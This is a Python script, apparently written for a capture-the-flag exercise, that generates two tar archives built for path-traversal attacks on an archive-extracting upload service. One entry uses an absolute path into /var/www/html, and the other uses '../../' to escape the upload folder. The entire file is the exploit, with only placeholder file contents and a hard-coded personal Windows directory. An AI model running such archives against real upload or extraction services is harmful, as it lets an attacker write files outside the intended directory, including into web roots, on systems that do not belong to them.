#!/usr/bin/env python3
"""Create tar that uses absolute paths or parent directory traversal."""
import tarfile
import io
import os

def create_absolute_path_tar():
    """Try creating files with absolute paths in tar."""
    content = b"FLAG_CONTENT_HERE"
    
    with tarfile.open("absolute_path.tar", "w") as tar:
        # Try absolute path (tar should strip leading /)
        ti = tarfile.TarInfo("/var/www/html/output.txt")
        ti.size = len(content)
        tar.addfile(ti, io.BytesIO(content))
    
    print("Created absolute_path.tar")

def create_parent_traversal_tar():
    """Create tar with ../../ in paths."""
    content = b"TEST_OUTPUT"
    
    with tarfile.open("parent_traversal.tar", "w") as tar:
        # Go up two levels from uploads/<unique>/ to reach uploads/
        # Then back down to a predictable name
        ti = tarfile.TarInfo("../../accessible.txt")
        ti.size = len(content)
        tar.addfile(ti, io.BytesIO(content))
    
    print("Created parent_traversal.tar")

if __name__ == "__main__":
    os.chdir(r"C:\Users\Alexandru Moga\Documents\first-gooogot-game\explo")
    create_absolute_path_tar()
    create_parent_traversal_tar()
